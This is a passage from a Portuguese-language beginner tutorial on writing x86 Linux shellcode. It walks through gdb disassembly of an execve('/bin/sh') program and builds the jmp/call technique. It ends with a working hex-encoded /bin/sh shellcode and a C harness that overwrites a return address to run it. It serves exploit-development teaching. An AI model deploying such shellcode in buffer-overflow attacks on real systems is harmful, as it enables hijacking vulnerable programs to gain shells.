	  call   0x80483fc <execve>

	  No exemplo acima, call chama o sys_call execve.


Existe ainda outra instrucao que eh considerada como sendode salto,
seria a instrucao LOOP, mas nao a descreverei nesse tutorial.


+ 6.5 Instrucoes Logicas
-------------------------

Sao instrucoes que o proprio nome jah denuncia, logicas!!Elas servem para  fazer
operacoes  logicas!  Conhecemos  elas  em  quase  todas  as  linguagens  que  se
prezem!Veremos  uma  comparacao  das  insrucoes  logicas  assembly  com  as   do
C.Vejamos:

     C	     Equivalente em     ASM
 --------  ----------------- --------

     & 				AND
     |				 OR
     ~				NOT
     ^				XOR

Nao vou colocar aqui a tabela verdade, olhe em qualquer tutorial de programacao,
pois quando a coisa eh logica, eh logica para todos!!:) Vejamos agora a  sintaxe
para cade instrucao logica:

* AND -> Eh o "e" logico.Sua sintaxe segue no exemplo abaixo:

	 and $0xfff,%eax

* OR  -> Eh o "ou" logico.

	 or $0xfff,%eax

* NOT -> Eh o "nao" logico.Eh usado para inverter os bits de um byte ou
	 uma word.

	 not %edx

* XOR -> Conhecido como "OR" exclusivo.XOR funciona da mesma forma que OR,
	 soh que usado exclusivamente,se apenas uma variavel tiver
         resultado esperado.Ele eh muito usado para inverter um determinado
	 bit de um byte ou um word, sem afetar os outros bits.

	 xor %edx

Caso tenha duvidas sobre isso, pesquise nos links mano, tem coisas boas lah!

--------------
7 - SHELLCODE |
--------------

Bem, chegamos entao a parte que de fato nos interessa.Escrever shellcodes nao eh
considerado coisa facil.Um  conhecimento basico de  assembly se faz  mais do que
necessario, uma vez que coloquei esses dados aih em cima, isso nao quer dizer de
modo  algum  que  voce  estah  apto para  sair  dizendo  por  aih  que manja  de
assembly.Meu  intuito  nao  eh  e nunca  serah  de  tornar  alguem expert  nesse
quesito.Se quiser, creio  que irah querer  ou ateh mesmo  irah necessitar, corra
atras de mais informacoes sobre isso.  Na parte de links voce poderah  encontrar
mais  textos que  o ajudarao  a aprender  essa fascinante  e dificil  linguagem.
Partindo do pre-suposto que voce sabe programar o basico em ASM e C,pois  nossos
shellcodes serao para exploits em C, iremos agora dar inicio a esse  emocionante
aprendizado.

Como vimos  lah em  cima o  modelo usual  de memoria  nos possibilita  colocar e
armazenar dados numa regiao de memoria conhecida como Stack ou pilha.Uma vez que
podemos colocar dados, usaremos nossos neuronios para atingir nossos  objetivos,
a execucao de codigos via instrucoes asm no Stack.Nao entrarei em detalhes sobre
codigo arbitrario  pelo buffer,  ou mais  conhecido como  buffer overflow,  irei
explicar a  escrita basica  de shellcodes,  mas voce  terah que  pensar em  teus
esquemas,soh  recapitulo  que  antes  de  um  programa  ser  executado  o  FRAME
POINTER(EBP)  eh  salvo,em seguida  faz  do atual  STACK  POINTER o  novo  frame
pointer,  isso  eh   o  que  costumamos   chamar  de  procedimento   inicial  ou
preludio,isso servirah  mais a  frente para  intuitos de  overflow. Mais  abaixo
descreverei possiveis esquemas de uso para isso tudo.

Bem, para comecarmos,  iremos trabalhar em  cima do shellcode  mais conhecido na
atualidade, o codigo de execucao de /bin/sh.Vejamos:

7.1 - SHELLCODE /BIN/SH
------------------------

Este shellcode eh bastante difundido, e voce pode ver em varios txts como ele eh
escrito, mas  creio que  nao tao  de forma  detalhada quanto  neste, de qualquer
forma, este shellcode  eh bastante util,  principalmente em situacoes  de buffer
overflows.O seu codigo-fonte mais simples em C eh o seguinte:

/* Futuro shellcode /bin/sh */

#include <stdio.h>
main(){
char *comando[2];
comando[0]="/bin/sh";
comando[1]=NULL;
execve(comando[0],comando,NULL);
}

Se voce compilar ele normalmente verah que funciona perfeitamente.
[localhost:/]$ gcc -o shell shell.c
[localhost:/]$ ./bin_sh
$exit
exit

Agora iremos partir para analisar seu codigo em gdb.Para isso faz-se
necessario que voce o compile da seguinte forma:

[localhost:/]$gcc -o shell -static -ggdb shell.c

Feito isso amigo, prosseguimos abrindo seu codigo pelo debugador da
gnu(gdb) da seguinte forma:

[localhost:/]$ gdb shell
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions. Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

Em seguida digitamos "disassemble main", para que o gdb nos forneca o
codigo da funcao main em linguagem assembly.Veremos:

(gdb) disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     sub    $0x8,%esp
0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)
0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
0x8048164 <main+20>:    push   $0x0
0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax
0x8048169 <main+25>:    push   %eax
0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax
0x804816d <main+29>:    push   %eax
0x804816e <main+30>:    call   0x80483fc <execve>
0x8048173 <main+35>:    add    $0xc,%esp
0x8048176 <main+38>:    mov    %ebp,%esp
0x8048178 <main+40>:    pop    %ebp
0x8048179 <main+41>:    ret
End of assembler dump.
(gdb)

Bem amigo, vamos com calma, para  quem nao tem conhecido basico de  assembly sem
duvida estah voando nas instrucoes acima, mas veremos abaixo,no decorrer, o  que
representa cada instrucao desta aih.Se voce eh fera em assembly, vai pulando!

Vamos analisar o que estah sendo feito:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     sub    $0x8,%esp

Essa  tres primeiras  linhas correspondem  ao processo  inicial ou  procedimento
preludio.O  que  essas linhas  fazem  eh aquilo  que  descrevi no  inicio  desse
"capitulo" ,o que elas fazem eh:  primeiro eh salvar o frame pointer  antigo, em
seguida faz  do atual  stack pointer  o novo  frame pointer(mov %esp,%ebp), logo
apos autoriza espaco para as variaveis locais, onde no nosso caso eh:

char *comando[2];


Lembrando que ponteiro  eh uma word  long, entao ele  autoriza espaco para  duas
words ou 8 bytes como vimos(sub $0x8,%esp).Continuando:

0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)

Essa gigantesta linha aih nao tem nada de complexo como parece,o que estah sendo
feito aih eh a  copia do endereco da  string "/bin/sh"(valor 0x8058b28) sobre  o
primeiro ponteiro de comando[] (0xfffffff8(%ebp)). Isto equivale a: comando[0] =
"/bin/sh". Continuando:

0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)

O que foi feito agora eh a copia do valor 0x0, que eh equivalente a NULL,
sobre o segundo ponteiro de comando[].Isto eh equivalente a:
comando[1] = NULL; em nosso codigo shell.c acima.Continuando:

0x8048164 <main+20>:    push   $0x0

Bem amigos, aqui tem inicio a chamada da funcao execve(), lembrando,
o programa empurra os argumentos de execve em ordem inversa(do ultimo
argumento para o primeiro) sobre o stack.Acima vimos que comeca com
0x0 (NULL).Em nosso fonte shell.c temos: execve(comando[0],comando,NULL);
Eh a este NULL que estamos nos referindo.Continuando:

0x8048166 <main+22>:    lea    0xfffffff8(%ebp),%eax

Aqui ocorre o carregamento do endereco de comando[] sobre o registrador
EAX.Continuando:

0x8048169 <main+25>:    push   %eax

Esse nao possui segredo, o que ocorreu foi que empurramos o endereco
de comando[] que havia sido previamente carregado no registrado EAX
sobre o Stack. Continuando:

0x804816a <main+26>:    mov    0xfffffff8(%ebp),%eax

Aqui, carregamos o endereco da string "/bin/sh" sobre o registrador
EAX.Continuando:

0x804816d <main+29>:    push   %eax

Novamente a funcao push(), que nos diz dessa vez que estamos empurrando
os dados do registrado EAX, que nesse caso eh o endereco da string
"/bin/sh", sobre o Stack.Continuando:

0x804816e <main+30>:    call   0x80483fc <execve>

Aqui  acontece  o  seguinte,  ocorre a  chamada  a  biblioteca  de procedimentos
execve(), ou  simplesmente a  chamada propriamente  dita da  funcao execve().  A
instrucao chamada empurra o IP(Index Pointer) sobre o Stack. Lembrando que  apos
a execucao de  execve(), nosso programa  termina, entao as  linhas abaixo seguem
para voltar as rotinas anteriores:

0x8048173 <main+35>:    add    $0xc,%esp

0x8048176 <main+38>:    mov    %ebp,%esp
0x8048178 <main+40>:    pop    %ebp
0x8048179 <main+41>:    ret

Ocorre aih em  cima o seguinte,  eh o processo  de saida, retorna  o velho frame
pointer, faz dele o  stual stack pointer em  seguida esvazia a pilha  com pop. e
ret retorna p/ o sistema.

Agora analisaremos a funcao execve();

(gdb) disassemble execve
Dump of assembler code for function execve:
0x80483fc <execve>:     push   %ebp
0x80483fd <execve+1>:   mov    %esp,%ebp
0x80483ff <execve+3>:   push   %ebx
0x8048400 <execve+4>:   mov    $0xb,%eax
0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx
0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx
0x804840b <execve+15>:  mov    0x10(%ebp),%edx
0x804840e <execve+18>:  int    $0x80
0x8048410 <execve+20>:  mov    %eax,%edx
0x8048412 <execve+22>:  test   %edx,%edx
0x8048414 <execve+24>:  jge    0x8048426 <execve+42>
0x8048416 <execve+26>:  neg    %edx
0x8048418 <execve+28>:  push   %edx
0x8048419 <execve+29>:  call   0x8050b28 <__normal_errno_location>
0x804841e <execve+34>:  pop    %edx
0x804841f <execve+35>:  mov    %edx,(%eax)
0x8048421 <execve+37>:  mov    $0xffffffff,%eax
0x8048426 <execve+42>:  pop    %ebx
0x8048427 <execve+43>:  mov    %ebp,%esp
0x8048429 <execve+45>:  pop    %ebp
0x804842a <execve+46>:  ret
0x804842b <execve+47>:  nop
End of assembler dump.


O codigo parece complicado a  primeira vista,muitas instrucoes em assmebly,  nao
tao  conhecidas p/  um newbie,  como neg,test,jne,  mas que  sao explicadas  em
diversos tutoriais  internet a  fora.A maioria  das coisas  voce jah  pode saber
somente olhando e comparando com as explicacoes passadas. Mas vejamos:

0x80483fc <execve>:     push   %ebp
0x80483fd <execve+1>:   mov    %esp,%ebp
0x80483ff <execve+3>:   push   %ebx

Isso  eh o  mesmo procedimento  inicial descrito  na explicacao  sobre a  funcao
main().Pega-se o velho frame  pointer e salva-o, em  seguida faz do atual  stack
pointer o novo frame pointer e depois o empurra no stack.
Continuando:

0x8048400 <execve+4>:   mov    $0xb,%eax
Copia 0xb sobre EAX, que eh o numero 11 em decimal.Este numero corresponde
ao system call execve() na tabela de system calls do sistema.Voce pode
conferir essa tabela em /usr/include/sys/syscall.h , nao sei se isso
varia de linux para linux,mas creio que nao.Continuando:

0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx

O que aconteceu acima foi a copia do endereco de "/bin/sh" sobre EBX.
Continuando:

0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx

Copiamos o endereco de comando[] sobre ECX.

0x804840b <execve+15>:  mov    0x10(%ebp),%edx

Copiamos o endereco do ponteiro nulo (NULL) sobre EDX.

0x804840e <execve+18>:  int    $0x80

Aqui nos mudamos para o modo kernel.

Para o intuito da escrita de shellcodes, isso aqui eh o fim do estudo da  funcao
execve(), esses comandos que seguem  abaixo, jah sao mais complexos  e acredite,
creio serem  inuteis para  os nossos  objetivos!!Uma vez  que se  entra no  modo
kernel, as intrucoes  que seguem "nao  fazem" parte do  nosso programa.Se quiser
ver  como  a  coisa vai  se  complicando  digite na  linha  de  comandos do  gdb
"disassemble __normal_errno_location" e por aih vai.

O estudo  detalhado acima  nos dah  uma boa  base para  sabermos como funciona o
processo de execucao de nosso programa shell.c em instrucoes de "maquina".

Veremos abaixo alguns passos que nos ajudarao a escrever nosso shellcode.
Necessitaremos das seguintes coisas p/ podermos escrever nosso shellcode:

1. Termos a string "/bin/sh" terminada nula em algum lugar na memoria.
   Lembrando que estamos querendo executar esse comando, se fosse outro,
   logico que poderiamos mudar isso, mas a coisa se complicaria ainda
   mais.

2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
   por uma word null long.Por que isso? lembra do esquema:
   comando[1] = NULL;
   Se faz necessario isso aqui.

3. Copiar 0xb sobre o registrador EAX.
   Lembrando que de acordo com a tabela de system calls que podemos achar
   em /usr/include/sys/syscall.h, o numero decimal correspondente ao
   syscall execve() eh 11 (0xb).

4. Copiar o endereco da string "/bin/sh" sobre o registrador EBX.

5. Copiar o endereco da string "/bin/sh" sobre o registrador ECX.

6. Copiar o endereco da word null long sobre o registrador EDX.

7. Executar a intrucao int $0x80.

Para facilitar o aprendizado veremos como cada um dos passos citados
acima, no nosso exemplo inicial de shellcode:

1. 0x8048156 <main+6>:     movl   $0x8058b28,0xfffffff8(%ebp)

2. 0x804815d <main+13>:    movl   $0x0,0xfffffffc(%ebp)

3. 0x8048400 <execve+4>:   mov    $0xb,%eax

4. 0x8048405 <execve+9>:   mov    0x8(%ebp),%ebx

5. 0x8048408 <execve+12>:  mov    0xc(%ebp),%ecx

6. 0x804840b <execve+15>:  mov    0x10(%ebp),%edx

7. 0x804840e <execve+18>:  int    $0x80

O esquema acima eh apenas demonstrativo, ainda faltam alguns passos p/ seguir na
construcao  de um  shellcode eficiente.Por  exemplo,para evitar  que o  programa
continue buscando  instrucoes para  o Stack,  caso a  funcao execve()  falhe.Nos
precisaremos usar um artificio que faca com que o programa saia limpamente, caso
haja falha em execve().Sair limpamente significa voltar a linha de comando,  sem
que o programa  busque dados aleatorios  caso execve() falhe.Para  fazermos isso
basta inserir uma chamada normal de saida junto ao nosso shellcode.Fazemos  isso
da seguinte forma:

Pegamos e compilamos o programa abaixo:

------------------------------------------------------------------------
/* PROGRAMA QUE NOS AJUDARAH A SAIR LIMPAMENTE
   CASO EXECVE() FALHE
   Compile com: gcc -o saida -static -ggdb saida.c
*/

#include <stdio.h>

void main(){
exit(0);
}
-----------------------------------------------------------------------

Compilamos ele entao:
[localhost:/]$ gcc -o saida -static -ggdb saida.c

Logo apos a compilacao,chamamos nosso bom e velho debugador gdb para
vermos como isso fica em asm:

[localhost:/]$gdb saida
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

Em seguida digitamos "disassemble _exit" para que o gdb nos forneca o que
queremos saber.Atencao: digite _exit(com um traco antes, como estah aqui).

(gdb) disassemble _exit
Dump of assembler code for function _exit:
0x80483e4 <_exit>:      push   %ebp
0x80483e5 <_exit+1>:    mov    %esp,%ebp
0x80483e7 <_exit+3>:    push   %ebx
0x80483e8 <_exit+4>:    mov    $0x1,%eax
0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx
0x80483f0 <_exit+12>:   int    $0x80
0x80483f2 <_exit+14>:   mov    0xfffffffc(%ebp),%ebx
0x80483f5 <_exit+17>:   mov    %ebp,%esp
0x80483f7 <_exit+19>:   pop    %ebp
0x80483f8 <_exit+20>:   ret
0x80483f9 <_exit+21>:   nop
0x80483fa <_exit+22>:   nop
0x80483fb <_exit+23>:   nop
End of assembler dump.


Podemos facilmente ver algumas coisas, vamos analisar este codigo.

0x80483e4 <_exit>:      push   %ebp
0x80483e5 <_exit+1>:    mov    %esp,%ebp
0x80483e7 <_exit+3>:    push   %ebx

Procedimento inicial, o mesmo esquema descrito para a funcao execve()
acima.Continuando:

0x80483e8 <_exit+4>:    mov    $0x1,%eax

Aqui ele coloca 0x1 (1 em decimal) no registrado EAX.Esse eh o numero
correspondente ao system call exit() na tabela de system calls.
Continuando:

0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx

Aqui copia o endereco de exit, propriamente dito.Por que isso?? Veremos
porque logo abaixo.quando virmos algumas linhas de main().

0x80483f0 <_exit+12>:   int    $0x80

Muda para o modo kernel.

Disassemblando main, teremos:

(gdb) disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     push   $0x0
0x8048155 <main+5>:     call   0x804829c <exit>
0x804815a <main+10>:    add    $0x4,%esp
0x804815d <main+13>:    lea    0x0(%esi),%esi
0x8048160 <main+16>:    mov    %ebp,%esp
0x8048162 <main+18>:    pop    %ebp
0x8048163 <main+19>:    ret
End of assembler dump.

O que nos interessa para entendermos a linha <_exit+9> do codigo asm
de exit() eh somente o seguinte:

0x8048153 <main+3>:     push   $0x0
0x8048155 <main+5>:     call   0x804829c <exit>

Como o Stack pega os argumento de tras para frente, na linha do nosso
programa saida.c: exit(0), em asm teremos:

push $0x0  -> Empurra 0 sobre o Stack.
call exit  -> Chama a funcao exit().

Isso tudo fica armazenado em:
0x80483ed <_exit+9>:    mov    0x8(%ebp),%ebx

Eis aih o porque.
Quanto a usarmos 0 em exit(), eh somente porque a maioria dos programas
retornam 0 na saida para indicar que nao possui erros.Se tiver acesso
ao codigo fonte dos programas, verifique, porque isso pode muito bem
mudar.

Como necessitamos inserir uma saida limpa(caso execve() falhe), descrita
no exemplo acima, nossos passos em busca de um shellcode eficiente mudam.
Teremos entao agora:


1. Ter a string "/bin/sh" terminada nula em algum lugar na memoria.

2. Ter o endereco da string "/bin/sh" em algum lugar na memoria seguido
   por uma word null long.

3. Copiar 0xb sobre o registrado EAX.

4. Copiar o endereco do endereco da string "/bin/sh" sobre o registrado
   EBX.

5. Copiar o endereco da string "/bin/sh" sobre o registrado ECX.

6. Copiar o endereco da null word long sobre o registrador EDX.

7. Executar a instrucao int $0x80.

* Aqui comeca o exit().

8. Copiar 0x1 sobre registrado EAX.

9. Copiar 0x0 sobre o registrador EBX.

10.Executar a instrucao $0x80.

Como podemos ver, para a funcao  exit() nao temos muita coisa,senao tres  linhas
apenas, expliquei tudo aquilo acima porque  quero que voce entenda como a  coisa
funciona.Nao vejo como saber que necessitamos  do passo 9, sem sabermos de  onde
vem esse 0x0. Lembrando que eh para  Newbies que escrevo, nao o termo Newbie  do
livro "A Internet e os Hackers", onde a unica coisa que escapa neste livro eh  a
capa, tem um bom ditado para isso: "Nao julgue o livro pela capa!", quando  falo
Newbies, sao sim pesquisadores, pessoas  com espirito com fome de  conhecimento,
mas  que  por  um  motivo  ou   outro,  nao  conseguem  acesso  a  material   de
nivel.Manisfestos a parte, vamos continuando nossa jornada.

Sabemos os  passos que  devemos seguir,  entao iremos  agora formar esses passos
num esquema de codigos asm para facilitar ainda mais nosso aprendizado.

O esquema seria mais ou menos o seguinte:

movl endereco_da_string, endereco_do_endereco_da_string
movb $0x0, endereco_do_byte_nulo
movl $0x0, endereco_do_nulo
movl $0xb, %eax
movl endereco_da_string, %ebx
leal endereco_da_string, %ecx
leal string_nula, %edx
int $0x80
movl $0x1, %eax
movl $0x0, %ebx
int $0x80
/bin/sh vem aqui.

Podemos  visualizar  que  estamos  bem  proximo  de  conseguir  efetivar   nosso
shellcode.Mas surge um problema,  nos nao sabemos onde  no espaco da memoria  do
programa alvo  nos iremos  exploitar o  codigo(e a  string que  segue ele  serah
colocada).Uma possivel solucao  para isso, seria  usar as instrucoes  JMP e CALL
para  circular  nosso  codigo.Essas  instrucoes  podem  usar  enderecamento   IP
relativo, que despreza  que nos podemos  saltar para um  offset do IP  atual sem
necessitar saber  o endereco  exato de  onde na  memoria nos  queremos saltar.Se
colocarmos uma instrucao CALL antes da string "/bin/sh" e uma intrucao JMP  para
ela(instrucao CALL), o endereco da string  serah empurrado sobre o Stack como  o
endereco  de retorno(return  address) quando  CALL for  executado.Exato amigo!!
Acontecerah exatamente isto que  voce estah imaginando.Mas para  isso precisamos
copiar o endereco de retorno sobre um registrador, com isso a intrucao CALL pode
chamar o inicio de nosso codigo.Veremos agora como ficarah nosso esquema em asm:

jmp offset-para-chamar                  # 2 bytes
popl %esi                               # 1 byte
movl %esi, array-offset(%esi)           # 3 bytes
movb $0x0, nullbyte-offset(%esi)        # 4 bytes
movl $0x0, null-offset(%esi)            # 7 bytes
movl $0xb, %eax                         # 5 bytes
movl %esi, %ebx                         # 2 bytes
leal array-offset(%esi), %ecx           # 3 bytes
leal null-offset(%esi), %edx            # 3 bytes
int $0x80                               # 2 bytes
movl $0x1, %eax                         # 5 bytes
movl $0x0, %ebx                         # 5 bytes
int  $0x80                              # 2 bytes
call offset-para-popl                   # 5 bytes
/bin/sh vem aqui                        # 5 bytes

Analizando bem o esquema acima, veremos algumas mudancas, nao nos  conceitos,mas
na sintaxe asm propriamente dita, onde  (%esi) eh o source index, que  se refere
ao endereco  da memoria  onde se  encontrarah a  nossa string /bin/sh, lembrando
amigo, que esse comando descrito no final do esquema acima,mais precisamente  na
ultima linha(/bin/sh), eh o que queremos executar a partir da shell.Voce poderia
e pode, perfeita- mente colocar um comando, como "/bin/ls", para ver que isso se
refere somente a  um argumento para  a execucao de  um comando pela  shell. Isto
torna as  coisas  claras, no final  desse exemplo com  /bin/sh, eu acrescentarei
alguns possiveis comandos substitutos para essa ultima linha,  inclusive  alguns
exemplo de codigos maliciosos. Abaixo segue uma explicacao simples detalhando  o
que eh o eskema acima:

jmp offset-para-chamar                  # 3 bytes
popl %esi                               # 1 byte

Essas duas novas linhas sao responsaveis pela mudanca.jmp, como dito faz  saltar
para o endereco, nesse caso offset, declarado em offset-para-chamar. Esse offset
eh o endereco de call, apos isso, call chamarah popl %esi.Continuando:

movl %esi, array-offset(%esi)           # 3 bytes
movb $0x0, nullbyte-offset(%esi)        # 4 bytes
movl $0x0, null-offset(%esi)            # 7 bytes
movl $0xb, %eax                         # 5 bytes
movl %esi, %ebx                         # 2 bytes
leal array-offset(%esi), %ecx           # 3 bytes
leal null-offset(%esi), %edx            # 3 bytes
int $0x80                               # 2 bytes

Acima segue os nossos passos de 1 a 7, referentes aos codigos de execve().
Continuando:

movl $0x1, %eax                         # 5 bytes
movl $0x0, %ebx                         # 5 bytes
int  $0x80                              # 2 bytes

Acima estao os codigos referentes a funcao exit(), descritos nos nossos
passos de 8 a 10.Continuando:

call offset-para-popl                   # 5 bytes
/bin/sh vem aqui                        # 8 bytes

Aih  em cima  podemos ver  a instrucao  call, responsavel  por fazer  o giro  ou
circulo.Essa instrucao  chama a  intrucao popl  lah em  cima.Voce pode  estar se
perguntando  se  esse  giro  nao seria  um  loop  infinito.Na  verdade isso  nao
acontece, lembrando, estamos trabalhando com assembly, como estamos  manipulando
enderecos de memoria, o endereco correspondente a instrucao call que eh  saltada
usando  jmp  no  inicio,  nao  serah  mais  chamado,  logo  nao  existe  um loop
infinito.Acho que as  coisas sao mais  claras para o  pessoal que meche  bem com
"goto". :) Voce pode recapitular o item 6.4, caso ainda tenha duvida.

O grafico abaixo pode ajudar voce a compreender melhor tudo o que estah
acontecendo aqui:

Parte inferior                                    Topo da Memoria
da memoria

          buffer         sfp   ret      a       b        c

<---- [JJSSSSSSSSCCss] [ssss] [0xD8]  [0x01]  [0x02]  [0x03]
       ^|^       ^|              |
       |||_______||______________|
        ||_______||
         |________|


Topo do Stack                                     Parte inferior do Stack

Onde:

J -> Refere a intrucao JMP.
C -> Refere a instrucao CALL.
S -> Codigo asm que queremos executar.
s -> Codigo da string que queremos executar ("/bin/sh").

buffer -> Nosso buffer que conterah o shellcode..
sfp -> O frame pointer.      --_ Para efeito de
ret -> Endereco de retorno.  --    overflows

A seta indica para onde estah saltando a instrucao.

Espero que tudo tenha clareado mais para voce.Em cima disso, podemos calcular os
offsets necessarios para jmp saltar para call, de call para popl, do endereco da
string para o array, e  do endereco da string p/  a word null long. Caso  alguem
possua  duvidas  de como  se  descobrir os  offsets,  lembro novamente,  eh  bom
aprender   mais   sobre  assembly   e   praticar  as   operacoes   com  sistemas
numericos(decimal,hexa e binario)!!

Colocarei  novamente o  codigo para  que nao  haja duvidas  sobre como  saber o
endereco dos offsets a chamar.

jmp offset-para-chamar                # 3 bytes
popl %esi                             # 1 byte  ------	<---------------
movl %esi, array-offset(%esi)         # 3 bytes       |			|
movb $0x0, nullbyte-offset(%esi)      # 4 bytes       |			|
movl $0x0, null-offset(%esi)          # 7 bytes       |			|
movl $0xb, %eax                       # 5 bytes       | Somando tudo	|
movl %esi, %ebx                       # 2 bytes       |   teremos	|
leal array-offset(%esi), %ecx         # 3 bytes       ->  42 bytes	|
leal null-offset(%esi), %edx          # 3 bytes       |(0x2a em hexa)	|
int $0x80                             # 2 bytes       |			|
movl $0x1, %eax                       # 5 bytes       |			|
movl $0x0, %ebx                       # 5 bytes       |			|
int  $0x80                            # 2 bytes ______|			|
call offset-para-popl                 # 5 bytes --> 42 + 5 = 47(0x2f)---
/bin/sh vem aqui                      # 8 bytes


Seguindo em frente, veremos como nosso codigo ficarah inserindo-o em um programa
C, com os respectivos enderecos calculados. Somente observe, nao compile ainda.

#include<stdio.h>
#include <stdlib.h>
void main() {
__asm__("
        jmp    0x2a                     # 3 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)           # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax               # 5 bytes
        int    $0x80                    # 2 bytes
        call   -0x2f                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
");
}

Existe um  probleminha amigo,  para que  o nosso  codigo funcione,  necessitamos
declarar ele  como uma  variavel global,  para podermos  colocar nosso codigo no
Stack  ou  Segmento  Data(onde teremos  permissao  de  escrita) ,transferindo  o
controle  para  ele,pois  nosso  codigo modifica  ele  mesmo  e  muitos sistemas
operacionais  marcam  paginas de  codigos  read-only(soh leitura).Para  fazermos
isso, necessitamos da representacao hexadecimal do codigo binario.Vejamos abaixo
como fazer isso tudo:

* Primeiro compilamos o nosso programa acima, usando a seguinte sintaxe
  na linha de comando:

[localhost:/]$gcc -o shell -g -ggdb shell.c

* Em seguida executamos o debugador.

[localhost:/]$ gdb shell
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details. This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

* Agora vem a parte que se exige mais paciencia do fucador.Muita gente
  acha um saco ter que fazer isso, mas nao tem outro jeito,paciencia
  amigo.O esquema eh que o debugador nos dirah o codigo hexadecimal
  correspondente a cada uma da linha de comando.Para fazer isso voce
  digita o seguinte:

(gdb)disassemble main
Dump of assembler code for function main:
0x8048150 <main>:       push   %ebp
0x8048151 <main+1>:     mov    %esp,%ebp
0x8048153 <main+3>:     jmp    0x804817f <main+47>
0x8048155 <main+5>:     pop    %esi
0x8048156 <main+6>:     mov    %esi,0x8(%esi)
0x8048159 <main+9>:     movb   $0x0,0x7(%esi)
0x804815d <main+13>:    movl   $0x0,0xc(%esi)
0x8048164 <main+20>:    mov    $0xb,%eax
0x8048169 <main+25>:    mov    %esi,%ebx
0x804816b <main+27>:    lea    0x8(%esi),%ecx
0x804816e <main+30>:    lea    0xc(%esi),%edx
0x8048171 <main+33>:    int    $0x80
0x8048173 <main+35>:    mov    $0x1,%eax
0x8048178 <main+40>:    int    $0x80
0x804817a <main+42>:    call   0x8048150 <main>
0x804817f <main+47>:    das
0x8048180 <main+48>:    bound  %ebp,0x6e(%ecx)
0x8048183 <main+51>:    das
0x8048184 <main+52>:    jae    0x80481ee <__new_exitfn+54>
0x8048186 <main+54>:    add    %cl,0x90c35dec(%ecx)
End of assembler dump.

Isso voce jah sabe  o que faz(mostra codigo  asm do nosso programa),agora  amigo
para saber  o codigo  hexadecimal de  cada um  desses comandos,  voce terah  que
digitar o seguinte " x/xb <indice>" como no esquema abaixo:

(gdb) x/xb main+3
0x8048153 <main+3>:     0xeb
(gdb) x/xb main+4
0x8048154 <main+4>:     0x2a
(gdb) x/xb main+5
0x8048155 <main+5>:     0x5e
(gdb) x/xb main+6
0x8048156 <main+6>:     0x89
.
.
.
(gdb) x/xb main+56
0x8048188 <main+56>:    0xec
(gdb) x/xb main+57
0x8048189 <main+57>:    0x5d
(gdb) x/xb main+58
0x804818a <main+58>:    0xc3
(gdb) x/xb main+59
0x804818b <main+59>:    0x90

Voce comecarah com  o indice "main+3"  e irah ateh  quando chegar o  hexadecimal
"0x90"  que  corresponde  a  instrucao  NOP,  que  corresponte  a  uma instrucao
vazia(sem operacao nenhuma), que faz com que o programa siga em frente, como  se
ela nao existisse (essa linha nao deve entrar no nosso shell code).Caso em outro
shellcode  feito por  voce, isso  nao apareca,  coloque os  hexadecimais ateh  a
ultima instrucao da funcao main().

Feito tudo isso, voce colocarah todos as linhas do programa em hexa, numa
variavel global, como no esquema abaixo:

/* Exemplo inicial de shellcode
   Compile com: $gcc -o shell1 shell1.c

 */
#include <stdio.h>

char shellcode[] =
        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";

void main() {
   int *retorno;
  retorno = (int *)&retorno + 2;
   (*retorno) = (int)shellcode;

}

Depois de compilado voce pode executar ele normalmente, como no exemplo
abaixo:

[localhost:/]$ gcc -o shell1 shell1.c
[localhost:/]$./shell1
bash$ exit
exit

Como podemos ver, ele funciona perfeitamente.Mas vou direcionar agora a  solucao
de  um  problema para  aqueles  que usarao  shellcodes  em buffer  overflows.Nao
